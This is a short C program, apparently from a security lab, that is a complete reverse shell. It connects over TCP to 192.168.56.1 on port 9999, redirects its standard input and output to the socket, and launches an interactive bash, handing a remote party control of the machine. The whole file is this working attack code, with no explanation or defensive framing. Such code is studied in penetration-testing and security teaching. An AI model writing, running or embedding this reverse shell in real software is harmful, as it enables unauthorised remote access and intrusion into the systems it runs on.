#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netdb.h>
#include <unistd.h>
#define ERR_QUIT(a) do { perror(a); exit (1); } while (0);

int main()
{ 
    int sockfd = socket(PF_INET, SOCK_STREAM, 0);
    struct sockaddr_in remaddr = { 0 };

    remaddr.sin_family = AF_INET;
    remaddr.sin_port = htons(9999);
    remaddr.sin_addr.s_addr = inet_addr("192.168.56.1");

    if (connect(sockfd, (struct sockaddr *)&remaddr, sizeof(struct sockaddr)))
        ERR_QUIT("connect");

    for (int i = 0; i < 2; ++i ) 
        dup2 (sockfd, i);
    execl("/bin/bash", "/bin/bash", "-i", NULL);

    close(sockfd);
    return 0;
}
